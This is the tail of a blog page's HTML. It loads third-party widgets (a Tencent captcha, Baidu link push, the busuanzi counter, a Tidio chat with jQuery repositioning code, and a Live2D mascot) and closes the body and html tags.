    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    
        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
        <script>
            $(document).ready(function () {
                setInterval(change_Tidio, 50);
                function change_Tidio() {
                    var tidio=$("#tidio-chat iframe");
                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
                    }
                }
            });
        </script>
    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>
